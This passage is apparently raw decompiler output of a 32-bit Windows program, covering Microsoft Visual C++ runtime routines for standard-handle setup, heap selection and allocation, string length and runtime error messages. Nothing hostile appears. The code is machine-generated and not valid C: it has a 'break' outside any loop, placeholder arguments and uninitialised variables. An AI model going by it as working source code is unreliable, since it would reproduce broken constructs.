                            goto lab_0x4031b2;
                        } else {
                            // 0x403184
                            v7 = v30;
                            v14 = v28;
                            if ((v31 & 8) != 0) {
                                goto lab_0x403194;
                            } else {
                                int32_t v32 = v28 - 4; // 0x403189
                                *(int32_t *)v32 = v30;
                                int32_t v33 = GetFileType(&g110); // 0x40318a
                                v15 = v32;
                                if (v33 == 0) {
                                    goto lab_0x4031b2;
                                } else {
                                    // 0x403189
                                    v7 = *v29;
                                    v14 = v32;
                                    goto lab_0x403194;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
  lab_0x4031bb:;
    int32_t v34 = 0; // 0x4031bb
    int32_t v35 = v6; // 0x4031bb
    int32_t v36; // 0x40308b
    int32_t v37; // 0x40308b
    int32_t v38; // 0x40308b
    char * v39; // 0x4031cd
    while (true) {
      lab_0x4031bd:;
        int32_t v40 = v35;
        v36 = v34;
        int32_t v41 = g96 + 8 * v36; // 0x4031c2
        int32_t * v42 = (int32_t *)v41; // 0x4031c2
        if (*v42 != -1) {
            char * v43 = (char *)(v41 + 4); // 0x403218
            *v43 = *v43 | -128;
            v38 = v40;
            goto lab_0x40321c;
        } else {
            // 0x4031cb
            v39 = (char *)(v41 + 4);
            *v39 = -127;
            int32_t * v44; // 0x40308b
            int32_t v45; // 0x40308b
            int32_t v46; // 0x40308b
            if (v36 != 0) {
                int32_t v47 = v40 - 4; // 0x4031e2
                v44 = (int32_t *)v47;
                v45 = v47;
                v46 = (int32_t)(v36 != 1) - 11;
            } else {
                int32_t v48 = v40 - 4;
                int32_t * v49 = (int32_t *)v48;
                *v49 = -10;
                v44 = v49;
                v45 = v48;
                v46 = -10;
            }
            // 0x4031e2
            *v44 = v46;
            int32_t * v50 = GetStdHandle((int32_t)&g110); // 0x4031e3
            v37 = v45;
            if (v50 == (int32_t *)-1) {
                goto lab_0x403207;
            } else {
                int32_t v51 = (int32_t)v50; // 0x4031e3
                int32_t v52 = v40 - 8; // 0x4031f0
                *(int32_t *)v52 = v51;
                int32_t v53 = GetFileType(&g110); // 0x4031f1
                v37 = v52;
                if (v53 == 0) {
                    goto lab_0x403207;
                } else {
                    int32_t v54 = v53 & 255; // 0x4031fb
                    *v42 = v51;
                    v37 = v52;
                    if (v54 != 2) {
                        // 0x40320d
                        v38 = v52;
                        if (v54 == 3) {
                            // 0x403212
                            *v39 = *v39 | 8;
                            v38 = v52;
                        }
                        goto lab_0x40321c;
                    } else {
                        goto lab_0x403207;
                    }
                }
            }
        }
    }
  lab_0x403222:;
    // 0x403222
    int32_t v55; // 0x40308b
    *(int32_t *)(v55 - 4) = (int32_t)g98;
    return SetHandleCount((int32_t)&g110);
  lab_0x40321c:
    // 0x40321c
    v55 = v38;
    int32_t v56 = v36 + 1; // 0x40321c
    v34 = v56;
    v35 = v55;
    if (v56 == 3) {
        // break -> 0x403222
        goto lab_0x403222;
    }
    goto lab_0x4031bd;
  lab_0x403207:
    // 0x403207
    *v39 = *v39 | 64;
    v38 = v37;
    goto lab_0x40321c;
  lab_0x4031b2:;
    int32_t v57 = v12 + 1; // 0x4031b2
    v10 += 4;
    v13 = v15;
    v8 = v9 + 1;
    v11 = v57;
    v6 = v15;
    if (v57 >= v16) {
        // break -> 0x4031bb
        goto lab_0x4031bb;
    }
    goto lab_0x403175;
  lab_0x403194:;
    int32_t v58 = *(int32_t *)(4 * v12 / 32 + (int32_t)&g96); // 0x40319e
    int32_t v59 = v58 + (8 * v12 & 248); // 0x4031a5
    *(int32_t *)v59 = v7;
    *(char *)(v59 + 4) = *v19;
    v15 = v14;
    goto lab_0x4031b2;
}

// Address range: 0x403236 - 0x403263
int32_t function_403236(int32_t a1) {
    // 0x403236
    *(int32_t *)a1 = 0;
    int32_t * moduleHandle = GetModuleHandleA(NULL); // 0x403240
    int32_t result = (int32_t)moduleHandle; // 0x403240
    if (*(int16_t *)moduleHandle != 0x5a4d) {
        // 0x403261
        return result;
    }
    int32_t v1 = *(int32_t *)(result + 60); // 0x40324d
    int32_t result2 = result; // 0x403252
    if (v1 != 0) {
        int32_t v2 = v1 + result; // 0x403254
        *(char *)a1 = *(char *)(v2 + 26);
        unsigned char v3 = *(char *)(v2 + 27); // 0x40325b
        *(char *)(a1 + 1) = v3;
        result2 = v2 & -256 | (int32_t)v3;
    }
    // 0x403261
    return result2;
}

// Address range: 0x403263 - 0x4033ab
int32_t function_403263(void) {
    // 0x403263
    int32_t v1; // 0x403263
    function_405830(v1);
    int32_t v2; // 0x403263
    char v3 = v2; // bp-8, 0x403276
    if (GetVersionExA((struct _OSVERSIONINFOA *)148)) {
        // 0x40328c
        uint32_t v4; // 0x403263
        int32_t v5; // 0x403263
        if (v4 >= 5 && v5 == 2) {
            // 0x4033a8
            return 1;
        }
    }
    char * v6 = "__MSVCRT_HEAP_SELECT"; // bp-24, 0x4032b2
    int32_t v7 = (int32_t)&v6; // 0x4032b2
    char lpBuffer; // bp-4656, 0x403263
    int32_t v8 = GetEnvironmentVariableA("__MSVCRT_HEAP_SELECT", &lpBuffer, 0x1090); // 0x4032b7
    int32_t v9 = v7; // 0x4032bf
    int32_t v10; // 0x40334c
    int32_t v11; // 0x403352
    if (v8 == 0) {
        goto lab_0x403395;
    } else {
        int32_t v12 = &lpBuffer; // 0x4032c7
        if (lpBuffer != 0) {
            if (lpBuffer <= 122) {
                // 0x4032df
                *(char *)v12 = lpBuffer - 32;
            }
            int32_t v13 = v12 + 1; // 0x4032e3
            char v14 = *(char *)v13; // 0x4032e4
            while (v14 != 0) {
                int32_t v15 = v13;
                char v16 = v14; // 0x4032d5
                if (v16 <= 122) {
                    // 0x4032df
                    *(char *)v15 = v16 - 32;
                }
                // 0x4032e3
                v13 = v15 + 1;
                v14 = *(char *)v13;
            }
        }
        int32_t v17 = (int32_t)"__GLOBAL_HEAP_SELECTED"; // bp-36, 0x4032f1
        int32_t v18 = function_4057f0("__GLOBAL_HEAP_SELECTED", (int32_t *)&lpBuffer, 22); // 0x4032f6
        v10 = v12;
        v11 = v7;
        if (v18 != 0) {
            // 0x40330a
            v17 = 0;
            char lpFilename; // bp-416, 0x403263
            GetModuleFileNameA(NULL, &lpFilename, 260);
            if (lpFilename != 0) {
                int32_t v19 = &lpFilename;
                if (lpFilename <= 122) {
                    // 0x403335
                    *(char *)v19 = lpFilename - 32;
                }
                int32_t v20 = v19 + 1; // 0x403339
                char v21 = *(char *)v20; // 0x40333a
                while (v21 != 0) {
                    // 0x40332b
                    v19 = v20;
                    char v22 = v21; // 0x40332b
                    if (v22 <= 122) {
                        // 0x403335
                        *(char *)v19 = v22 - 32;
                    }
                    // 0x403339
                    v20 = v19 + 1;
                    v21 = *(char *)v20;
                }
            }
            // 0x403353
            v10 = function_405770((int32_t *)&lpBuffer, (int32_t *)&lpFilename);
            v11 = &v17;
            v9 = v11;
            if (v10 == 0) {
                goto lab_0x403395;
            } else {
                goto lab_0x403357;
            }
        } else {
            goto lab_0x403357;
        }
    }
  lab_0x403395:
    // 0x403395
    *(int32_t *)(v9 - 4) = (int32_t)&v3;
    function_403236((int32_t)&g110);
    // 0x4033a8
    return (int32_t)(v3 < 6) + 3;
  lab_0x403357:;
    int32_t * v23 = (int32_t *)(v11 - 4); // 0x403357
    *v23 = 44;
    int32_t * v24 = (int32_t *)(v11 - 8); // 0x403359
    *v24 = v10;
    int32_t v25 = function_4056b0((int32_t)&g110, (int32_t)&g110); // 0x40335a
    v9 = v11;
    if (v25 != 0) {
        int32_t v26 = v25 + 1; // 0x403365
        char v27 = *(char *)v26; // 0x403368
        char v28 = v27; // 0x40336a
        if (v27 != 0) {
            int32_t v29 = v26;
            while (v28 != 59) {
                int32_t v30 = v29 + 1; // 0x403375
                char v31 = *(char *)v30;
                v28 = v31;
                if (v31 == 0) {
                    goto lab_0x40337a;
                }
                v29 = v30;
            }
            // 0x403376
            *(char *)v29 = 0;
        }
      lab_0x40337a:
        // 0x40337a
        *v23 = 10;
        *v24 = 0;
        *(int32_t *)(v11 - 12) = v26;
        int32_t result = function_405480((int32_t)&g110, (int32_t)&g110, (int32_t)&g110); // 0x40337e
        v9 = v11;
        if (result < 4) {
            // 0x4033a8
            return result;
        }
    }
    goto lab_0x403395;
}

// Address range: 0x4033ab - 0x403408
int32_t function_4033ab(int32_t a1) {
    int32_t * v1 = HeapCreate((int32_t)(bool)(a1 == 0), 0x1000, 0); // 0x4033bc
    g94 = (int32_t)v1;
    if (v1 == NULL) {
        // 0x403401
        return 0;
    }
    int32_t v2 = function_403263(); // 0x4033cb
    g95 = v2;
    int32_t v3; // 0x4033ab
    if (v2 != 3) {
        // 0x4033e7
        if (v2 != 2) {
            // 0x403401
            return 1;
        }
        // 0x4033ec
        v3 = function_40436f();
    } else {
        // 0x4033da
        v3 = function_403b1e(1016);
    }
    int32_t result = 1; // 0x4033f3
    if (v3 == 0) {
        // 0x4033f5
        HeapDestroy((int32_t *)g94);
        result = 0;
    }
    // 0x403401
    return result;
}

// Address range: 0x4034d5 - 0x4034de
int32_t function_4034d5(void) {
    // 0x4034d5
    int32_t result; // 0x4034d5
    return result;
}

// Address range: 0x4034f8 - 0x4035bd
int32_t function_4034f8(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4034f8
    int32_t v1; // 0x4034f8
    uint32_t v2; // 0x4034f8
    int32_t v3; // 0x4034f8
    *(char *)v1 = (char)(v2 / 256 ^ v1 ^ v3);
    int32_t v4; // 0x4034f8
    char * v5 = (char *)v4; // bp-4, 0x403500
    int32_t v6 = (int32_t)&v5; // 0x403501
    int32_t v7 = v6; // bp-28, 0x403509
    if ((*(int32_t *)(a1 + 4) & 6) != 0) {
        // 0x4035a0
        __local_unwind2();
        // 0x4035b5
        return 1;
    }
    int32_t v8 = a1; // bp-12, 0x40351e
    int32_t v9 = &v8; // 0x403527
    *(int32_t *)(a2 - 4) = v9;
    int32_t v10 = *(int32_t *)(a2 + 12); // 0x40352d
    if (v10 == -1) {
        // 0x4035b5
        return 1;
    }
    int32_t v11 = &v7;
    int32_t v12 = 12 * v10;
    int32_t v13 = v12; // 0x403540
    int32_t v14 = v9; // 0x403540
    int32_t v15 = a2; // 0x403540
    int32_t v16 = v11; // 0x403540
    int32_t v17 = v6; // 0x403540
    int32_t v18; // 0x403542
    int32_t * v19; // 0x403542
    int32_t * v20; // 0x403543
    int32_t v21; // 0x40354c
    int32_t v22; // 0x40354d
    int32_t v23; // 0x4034f8
    int32_t v24; // 0x40357d
    if (*(int32_t *)(*(int32_t *)(a2 + 8) + 4 + v12) != 0) {
        // 0x403542
        v18 = v11 - 4;
        v19 = (int32_t *)v18;
        *v19 = v10;
        v20 = (int32_t *)(v11 - 8);
        *v20 = v6;
        v21 = *v19;
        v22 = *(int32_t *)(v6 + 12);
        if (v9 == 0) {
            // 0x403542
            v13 = 12 * v21;
            v14 = 0;
            v15 = v22;
            v16 = v11;
            v17 = v6;
        } else {
            // 0x403554
            if (v9 < 0) {
                // break -> 0x4035b5
                break;
            }
            // 0x403556
            *v19 = v22;
            __global_unwind2();
            *v19 = v21;
            *v20 = v22;
            __local_unwind2();
            *v19 = 1;
            __NLG_Notify();
            v23 = 12 * v21;
            v24 = *(int32_t *)(*(int32_t *)(v22 + 8) + v23);
            *(int32_t *)(v22 + 12) = v24;
            v13 = v23;
            v14 = v24;
            v15 = v22;
            v16 = v18;
            v17 = v22 + 16;
        }
    }
    int32_t v25 = v15;
    int32_t v26 = *(int32_t *)(v25 + 8); // 0x403587
    int32_t v27 = *(int32_t *)(v26 + v13); // 0x40358d
    int32_t result = 1; // 0x403536
    while (v27 != -1) {
        int32_t v28 = v27;
        v11 = v16;
        int32_t v29 = v17;
        int32_t v30 = v14;
        v12 = 12 * v28;
        v13 = v12;
        v14 = v30;
        v15 = v25;
        v16 = v11;
        v17 = v29;
        if (*(int32_t *)(v26 + 4 + v12) != 0) {
            // 0x403542
            v18 = v11 - 4;
            v19 = (int32_t *)v18;
            *v19 = v28;
            v20 = (int32_t *)(v11 - 8);
            *v20 = v29;
            v21 = *v19;
            v22 = *(int32_t *)(v29 + 12);
            if (v30 == 0) {
                // 0x403542
                v13 = 12 * v21;
                v14 = 0;
                v15 = v22;
                v16 = v11;
                v17 = v29;
            } else {
                // 0x403554
                result = 0;
                if (v30 < 0) {
                    // break -> 0x4035b5
                    break;
                }
                // 0x403556
                *v19 = v22;
                __global_unwind2();
                *v19 = v21;
                *v20 = v22;
                __local_unwind2();
                *v19 = 1;
                __NLG_Notify();
                v23 = 12 * v21;
                v24 = *(int32_t *)(*(int32_t *)(v22 + 8) + v23);
                *(int32_t *)(v22 + 12) = v24;
                v13 = v23;
                v14 = v24;
                v15 = v22;
                v16 = v18;
                v17 = v22 + 16;
            }
        }
        // 0x403587
        v25 = v15;
        v26 = *(int32_t *)(v25 + 8);
        v27 = *(int32_t *)(v26 + v13);
        result = 1;
    }
    // 0x4035b5
    return result;
}

// Address range: 0x4035d8 - 0x403611
int32_t __FF_MSGBANNER(void) {
    // 0x4035d8
    if (g46 == 1) {
        // 0x4035ef
        __NMSG_WRITE(252);
        // 0x403610
        return __NMSG_WRITE(255);
    }
    // 0x4035e2
    if (g46 != 0 || g14 != 1) {
        // 0x403610
        return g46;
    }
    // 0x4035ef
    __NMSG_WRITE(252);
    // 0x403610
    return __NMSG_WRITE(255);
}

// Address range: 0x403611 - 0x403764
int32_t __NMSG_WRITE(int32_t a1) {
    int32_t result = &g28; // 0x40361f
    int32_t v1 = 0; // 0x40361f
    while (*(int32_t *)result != a1) {
        // 0x403628
        result += 8;
        v1++;
        if (result >= (int32_t)&g30) {
            // break -> 0x403633
            break;
        }
    }
    int32_t v2 = 8 * v1; // 0x403636
    if (*(int32_t *)(v2 + (int32_t)&g28) != a1) {
        // 0x403761
        return result;
    }
    // 0x403645
    if (g46 != 1) {
        // 0x403653
        if (g46 == 0 != (g14 == 1)) {
            // 0x403664
            if (a1 == 252) {
                // 0x403761
                return g46;
            }
            // 0x403670
            int32_t lpFilename; // bp-424, 0x403611
            int32_t nameSize = GetModuleFileNameA(NULL, (char *)&lpFilename, 260); // 0x40367e
            int32_t v3 = &lpFilename;
            if (nameSize == 0) {
                // 0x403688
                function_404fb0(v3);
            }
            int32_t v4 = function_403840(v3); // 0x4036a9
            int32_t v5 = v3; // 0x4036b3
            if (v4 >= 60) {
                // 0x4036b5
                int32_t v6; // bp-483, 0x403611
                v5 = function_403840(v3) + (int32_t)&v6;
                function_4058f0(v5, "...", 3);
            }
            // 0x4036de
            int32_t v7; // bp-164, 0x403611
            function_404fb0((int32_t)&v7);
            function_404fc0(&v7, v5);
            function_404fc0(&v7, (int32_t)"\n\n");
            function_404fc0(&v7, *(int32_t *)(v2 + (int32_t)&g29));
            // 0x403761
            return function_40585f(&v7, "Microsoft Visual C++ Runtime Library", 0x12010);
        }
    }
    // 0x40373b
    function_403840(*(int32_t *)(v2 + (int32_t)&g29));
    bool result2 = WriteFile(GetStdHandle(-12), &g110, (int32_t)&g110, &g110, (struct _OVERLAPPED *)&g110); // 0x40375b
    // 0x403761
    return result2;
}

// Address range: 0x4037a2 - 0x403816
int32_t __heap_alloc(uint32_t a1) {
    // 0x4037a2
    int32_t v1; // 0x4037a2
    if (g95 != 3) {
        if (g95 != 2) {
            // 0x4037f8
            v1 = a1 != 0 ? a1 + 15 & -16 : 16;
            goto lab_0x403805;
        } else {
            int32_t v2 = a1 == 0 ? 16 : a1 + 15 & -16;
            v1 = v2;
            if (v2 <= g36) {
                int32_t result = function_404667(v2 / 16); // 0x4037ec
                v1 = v2;
                if (result != 0) {
                    // 0x4037c4
                    return result;
                }
            }
            goto lab_0x403805;
        }
    } else {
        // 0x4037b1
        if (g93 >= a1) {
            int32_t result2 = function_403eba(a1); // 0x4037ba
            if (result2 != 0) {
                // 0x4037c4
                return result2;
            }
        }
        // 0x4037f8
        v1 = a1 != 0 ? a1 + 15 & -16 : 16;
        goto lab_0x403805;
    }
  lab_0x403805:;
    // 0x403805
    int32_t v3; // bp-4, 0x4037a2
    int32_t v4 = &v3; // 0x4037a7
    *(int32_t *)(v4 - 4) = v1;
    *(int32_t *)(v4 - 8) = 0;
    *(int32_t *)(v4 - 12) = g94;
    int32_t * v5 = HeapAlloc(&g110, (int32_t)&g110, (int32_t)&g110); // 0x40380e
    // 0x4037c4
    return (int32_t)v5;
}

// Address range: 0x403816 - 0x40383c
int32_t function_403816(uint32_t a1, int32_t a2) {
    // 0x403816
    if ((int32_t)g98 <= a1) {
        // 0x403822
        return 0;
    }
    int32_t v1 = *(int32_t *)(4 * a1 / 32 + (int32_t)&g96); // 0x40382d
    return (int32_t)(*(char *)(v1 + (8 * a1 & 248 | 4)) & 64);
}

// Address range: 0x403840 - 0x4038bb
int32_t function_403840(int32_t a1) {
    int32_t v1 = a1; // 0x40384a
    if ((a1 & 3) != 0) {
        int32_t v2 = a1;
        int32_t v3 = v2 + 1; // 0x40384e
        while (*(char *)v2 != 0) {
            // 0x403853
            v1 = v3;
            if ((v3 & 3) == 0) {
                goto lab_0x403860;
            }
            v2 = v3;
            v3 = v2 + 1;
        }
        // 0x403893
        return v3 + -1 - a1;
    }
  lab_0x403860:;
    int32_t v4 = v1; // 0x403840
    int32_t v5; // 0x403840
    while (true) {
        // 0x403860
        v5 = v4;
        uint32_t v6 = *(int32_t *)v5; // 0x403860
        int32_t v7 = v5 + 4; // 0x40386e
        if (((v6 ^ -0x7efeff00 ^ v6 + 0x7efefeff) & -0x7efeff00) != 0) {
            if ((char)v6 == 0) {
                // break -> 0x4038b1
                break;
            }
            if ((v6 & 0xff00) == 0) {
                // 0x4038a7
                return 1 - a1 + v5;
            }
            if ((v6 & 0xff0000) == 0) {
                // 0x40389d
                return 2 - a1 + v5;
            }
            int32_t v8 = v7; // 0x40388f
            if (v6 < 0x1000000) {
                // 0x403893
                return v8 + -1 - a1;
            }
        }
        // 0x403860
        v4 = v7;
    }
    // 0x4038b1
    return v5 - a1;
}

// Address range: 0x4038bb - 0x403923
int32_t function_4038bb(int32_t lpMultiByteStr, int32_t a2) {
    int32_t v1 = 0x10000 * a2 / 0x10000;
    int32_t lpWideCharStr = v1;
    int32_t lpUsedDefaultChar = lpMultiByteStr;
    if (lpMultiByteStr == 0) {
        // 0x4038c5
        return lpMultiByteStr;
    }
    // 0x4038c7
    if (g75 == 0) {
        if ((int16_t)v1 < 256) {
            // 0x4038db
            *(char *)lpMultiByteStr = (char)v1;
            return 1;
        }
        // 0x403914
        g49 = 42;
        // 0x4038c5
        return -1;
    }
    // 0x4038e2
    lpUsedDefaultChar = 0;
    int32_t result = WideCharToMultiByte(g76, 544, (int16_t *)&lpWideCharStr, 1, (char *)lpMultiByteStr, g44, NULL, (bool *)&lpUsedDefaultChar); // 0x403904
    if (result != 0 == lpUsedDefaultChar == 0) {
        // 0x4038c5
        return result;
    }
    // 0x403914
    g49 = 42;
    // 0x4038c5
    return -1;
}

// Address range: 0x403a15 - 0x403ac6
int32_t function_403a15(int32_t a1, int32_t a2) {
    uint32_t v1 = a2 * a1; // 0x403a1c
    int32_t v2 = v1; // 0x403a27
    if (v1 < 0xffffffe1) {
        // 0x403a29
        v2 = v1 != 0 ? v1 + 15 & -16 : 16;
    }
    // 0x403a36
    int32_t v3; // bp-12, 0x403a15
    int32_t v4 = &v3;
    int32_t v5 = v4; // 0x403a3b
    int32_t v6 = 0; // 0x403a3b
    int32_t v7; // 0x403a15
    int32_t v8; // 0x403a15
    int32_t * v9; // 0x403a89
    int32_t v10; // 0x403a73
    int32_t * v11; // 0x403a15
    int32_t v12; // 0x403a74
    int32_t v13; // 0x403a52
    int32_t * v14; // 0x403a15
    int32_t v15; // 0x403a53
    if (v2 < 0xffffffe1) {
        // 0x403a3d
        if (g95 != 3) {
            // 0x403a61
            if (g95 == 2 && v2 <= g36) {
                // 0x403a6e
                v10 = v4 - 4;
                v11 = (int32_t *)v10;
                *v11 = v2 / 16;
                v12 = function_404667((int32_t)&g110);
                if (v12 != 0) {
                    // 0x403abf
                    *v11 = v2;
                    v7 = v12;
                    v8 = v10;
                    goto lab_0x403aae;
                }
            }
        } else {
            // 0x403a47
            if (v1 <= g93) {
                // 0x403a52
                v13 = v4 - 4;
                v14 = (int32_t *)v13;
                *v14 = v1;
                v15 = function_403eba((int32_t)&g110);
                if (v15 != 0) {
                    // 0x403aab
                    *v14 = v1;
                    v7 = v15;
                    v8 = v13;
                    goto lab_0x403aae;
                }
            }
        }
        // 0x403a80
        *(int32_t *)(v4 - 4) = v2;
        *(int32_t *)(v4 - 8) = 8;
        v5 = v4 - 12;
        *(int32_t *)v5 = g94;
        v9 = HeapAlloc(&g110, (int32_t)&g110, (int32_t)&g110);
        v6 = (int32_t)v9;
        if (v9 != NULL) {
            // break -> 0x403abb
            break;
        }
    }
    int32_t result = v6; // 0x403a9c
    while (g73 != 0) {
        // 0x403a9e
        *(int32_t *)(v5 - 4) = v2;
        int32_t v16 = __callnewh((int32_t)&g110); // 0x403a9f
        result = 0;
        if (v16 == 0) {
            // break -> 0x403abb
            break;
        }
        v4 = v5;
        v5 = v4;
        v6 = 0;
        if (v2 < 0xffffffe1) {
            // 0x403a3d
            if (g95 != 3) {
                // 0x403a61
                if (g95 == 2 && v2 <= g36) {
                    // 0x403a6e
                    v10 = v4 - 4;
                    v11 = (int32_t *)v10;
                    *v11 = v2 / 16;
                    v12 = function_404667((int32_t)&g110);
                    if (v12 != 0) {
                        // 0x403abf
                        *v11 = v2;
                        v7 = v12;
                        v8 = v10;
                        goto lab_0x403aae;
                    }
                }
            } else {
                // 0x403a47
                if (v1 <= g93) {
                    // 0x403a52
                    v13 = v4 - 4;
                    v14 = (int32_t *)v13;
                    *v14 = v1;
                    v15 = function_403eba((int32_t)&g110);
                    if (v15 != 0) {
                        // 0x403aab
                        *v14 = v1;
                        v7 = v15;
                        v8 = v13;
                        goto lab_0x403aae;
                    }
                }
            }
            // 0x403a80
            *(int32_t *)(v4 - 4) = v2;
            *(int32_t *)(v4 - 8) = 8;
            v5 = v4 - 12;
            *(int32_t *)v5 = g94;
            v9 = HeapAlloc(&g110, (int32_t)&g110, (int32_t)&g110);
            v6 = (int32_t)v9;
            result = v6;
            if (v9 != NULL) {
                // break -> 0x403abb
                break;
            }
        }
        // 0x403a95
        result = v6;
    }
    // 0x403abb
    return result;
  lab_0x403aae:
    // 0x403aae
    *(int32_t *)(v8 - 4) = 0;
    *(int32_t *)(v8 - 8) = v7;
    function_405a20((int32_t)&g110, (int32_t)&g110, (int32_t)&g110);
    result = v7;
    return result;
}

// Address range: 0x403ac6 - 0x403b1e
int32_t function_403ac6(void) {
    // 0x403ac6
    if (g105 < 4) {
        // 0x403b19
        return 0;
    }
    // 0x403ad5
    int32_t v1; // bp-8, 0x403ac6
    int32_t * v2 = (int32_t *)((int32_t)&v1 - 4);
    int32_t v3 = 0;
    uint32_t v4 = 3;
    int32_t v5 = 4 * v4; // 0x403ada
    int32_t v6 = *(int32_t *)(g103 + v5); // 0x403ada
    int32_t v7 = v3; // 0x403adf
    int32_t v8; // 0x403ac6
    int32_t v9; // 0x403ac6
    if (v6 != 0) {
        // 0x403ae1
        v8 = v3;
        if ((*(char *)(v6 + 12) & -125) != 0) {
            // 0x403ae7
            *v2 = v6;
            v8 = v3 + (int32_t)(function_4012ca((int32_t)&g110) != -1);
        }
        // 0x403af4
        v9 = v8;
        v7 = v9;
        if (v4 >= 20) {
            // 0x403af9
            *v2 = *(int32_t *)(g103 + v5);
            function_401f99((int32_t)&g110);
            *(int32_t *)(g103 + v5) = 0;
            v7 = v9;
        }
    }
    int32_t result = v7;
    int32_t v10 = v4 + 1; // 0x403b10
    while (v10 < g105) {
        // 0x403ad5
        v3 = result;
        v4 = v10;
        v5 = 4 * v4;
        v6 = *(int32_t *)(g103 + v5);
        v7 = v3;
        if (v6 != 0) {
            // 0x403ae1
            v8 = v3;
            if ((*(char *)(v6 + 12) & -125) != 0) {
                // 0x403ae7
                *v2 = v6;
                v8 = v3 + (int32_t)(function_4012ca((int32_t)&g110) != -1);
            }
            // 0x403af4
            v9 = v8;
            v7 = v9;
            if (v4 >= 20) {
                // 0x403af9
                *v2 = *(int32_t *)(g103 + v5);
                function_401f99((int32_t)&g110);
                *(int32_t *)(g103 + v5) = 0;
                v7 = v9;
            }
        }
        // 0x403b10
        result = v7;
        v10 = v4 + 1;
    }
    // 0x403b19
    return result;
}

// Address range: 0x403b1e - 0x403b66
int32_t function_403b1e(int32_t a1) {
    int32_t * v1 = HeapAlloc((int32_t *)g94, 0, 320); // 0x403b2b
    int32_t result = (int32_t)v1; // 0x403b2b
    g92 = result;
    if (v1 == NULL) {
        // 0x403b3a
        return result;
    }
    // 0x403b3b
    g90 = 0;
    g91 = 0;
    g89 = result;
    g93 = 0;
    g87 = 16;
    return 1;
}

// Address range: 0x403b66 - 0x403b91
int32_t function_403b66(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    uint32_t v1 = g92 + 20 * g91; // 0x403b73
    if (g92 >= v1) {
        // 0x403b90
        return 0;
    }
    int32_t v2 = g92; // 0x403b78
    int32_t result = v2; // 0x403b87
    while (a1 - *(int32_t *)(v2 + 12) >= 0x100000) {
        // 0x403b89
        v2 += 20;
        result = 0;
        if (v2 >= v1) {
            // break -> 0x403b90
            break;
        }
        result = v2;
    }
    // 0x403b90
    return result;
}

// Address range: 0x403b91 - 0x403eba
int32_t function_403b91(int32_t a1, int32_t a2) {
    int32_t result = *(int32_t *)(a1 + 16); // 0x403b9f
    int32_t v1 = a2 - 4; // 0x403ba5
    int32_t v2 = *(int32_t *)v1 - 1; // 0x403bc2
    if ((v2 & 1) != 0) {
        // 0x403eb5
        return result;
    }
    int32_t v3 = (a2 - *(int32_t *)(a1 + 12)) / 0x8000; // 0x403bab
    int32_t v4 = v2 + v1; // 0x403bcf
    int32_t v5 = *(int32_t *)v4; // 0x403bcf
    int32_t v6 = *(int32_t *)(a2 - 8); // 0x403bd8
    int32_t v7 = v2; // 0x403be7
    if ((v5 & 1) == 0) {
        int32_t * v8 = (int32_t *)(v2 + a2); // 0x403bf5
        int32_t * v9 = (int32_t *)(v4 + 8); // 0x403bf8
        if (*v8 == *v9) {
            uint32_t v10 = v5 / 16 - 1; // 0x403bec
            uint32_t v11 = v10 < 63 ? v10 : 63;
            int32_t v12 = result + 4 + v11;
            int32_t v13 = -1 - (0x80000000 >> (v11 & 31));
            int32_t v14 = 4 * v3;
            if (v11 >= 32) {
                int32_t * v15 = (int32_t *)(result + 196 + v14); // 0x403c30
                *v15 = *v15 & v13;
                char * v16 = (char *)v12; // 0x403c37
                char v17 = *v16 - 1; // 0x403c37
                *v16 = v17;
                if (v17 == 0) {
                    int32_t * v18 = (int32_t *)(a1 + 4); // 0x403c3e
                    *v18 = *v18 & v13;
                }
            } else {
                int32_t * v19 = (int32_t *)(result + 68 + v14); // 0x403c11
                *v19 = *v19 & v13;
                char * v20 = (char *)v12; // 0x403c15
                char v21 = *v20 - 1; // 0x403c15
                *v20 = v21;
                if (v21 == 0) {
                    int32_t * v22 = (int32_t *)a1; // 0x403c1c
                    *v22 = *v22 & v13;
                }
            }
        }
        // 0x403c4c
        *(int32_t *)(*v9 + 4) = *v8;
        *(int32_t *)(*v8 + 8) = *v9;
        v7 = v5 + v2;
    }
    int32_t result2 = result + 324 + 516 * v3; // 0x403bb6
    int32_t v23; // 0x403b91
    int32_t v24; // 0x403b91
    int32_t v25; // 0x403b91
    int32_t v26; // 0x403b91
    int32_t v27; // 0x403b91
    int32_t * v28; // 0x403b91
    int32_t * v29; // 0x403b91
    if ((v6 & 1) != 0) {
        uint32_t v30 = v7 / 16 - 1; // 0x403c6c
        v29 = (int32_t *)(a2 + 4);
        v28 = (int32_t *)a2;
        v24 = v1;
        v23 = v30 < 63 ? v30 : 63;
        v26 = v7;
        goto lab_0x403d29;
    } else {
        int32_t v31 = v1 - v6; // 0x403c84
        uint32_t v32 = v6 / 16 - 1; // 0x403c92
        uint32_t v33 = v32 < 63 ? v32 : 63;
        int32_t v34 = v7 + v6; // 0x403c9a
        uint32_t v35 = v34 / 16 - 1; // 0x403ca5
        int32_t v36 = v35 < 63 ? v35 : 63;
        v25 = v31;
        v27 = v34;
        if (v33 == v36) {
            goto lab_0x403daa;
        } else {
            // 0x403cb0
            v28 = (int32_t *)(v31 + 4);
            v29 = (int32_t *)(v31 + 8);
            if (*v28 == *v29) {
                uint32_t v37 = v33 & 31;
                if (v33 >= 32) {
                    int32_t v38 = -1 - (0x80000000 >> v37);
                    int32_t * v39 = (int32_t *)(result + 196 + 4 * v3); // 0x403ce8
                    *v39 = *v39 & v38;
                    char * v40 = (char *)(result + 4 + v33); // 0x403cef
                    char v41 = *v40 - 1; // 0x403cef
                    *v40 = v41;
                    if (v41 == 0) {
                        int32_t * v42 = (int32_t *)(a1 + 4); // 0x403cf8
                        *v42 = *v42 & v38;
                    }
                } else {
                    int32_t v43 = v37 == 0 ? 0x7fffffff : -1 - (0x80000000 >> v37);
                    int32_t * v44 = (int32_t *)(result + 68 + 4 * v3); // 0x403ccb
                    *v44 = *v44 & v43;
                    char * v45 = (char *)(result + 4 + v33); // 0x403ccf
                    char v46 = *v45 - 1; // 0x403ccf
                    *v45 = v46;
                    if (v46 == 0) {
                        int32_t * v47 = (int32_t *)a1; // 0x403cd8
                        *v47 = *v47 & v43;
                    }
                }
            }
            // 0x403d1b
            *(int32_t *)(*v29 + 4) = *v28;
            *(int32_t *)(*v28 + 8) = *v29;
            v24 = v31;
            v23 = v36;
            v26 = v34;
            goto lab_0x403d29;
        }
    }
  lab_0x403d29:;
    int32_t v48 = 8 * v23 + result2;
    int32_t * v49 = (int32_t *)(v48 + 4);
    *v28 = *v49;
    *v29 = v48;
    *v49 = v24;
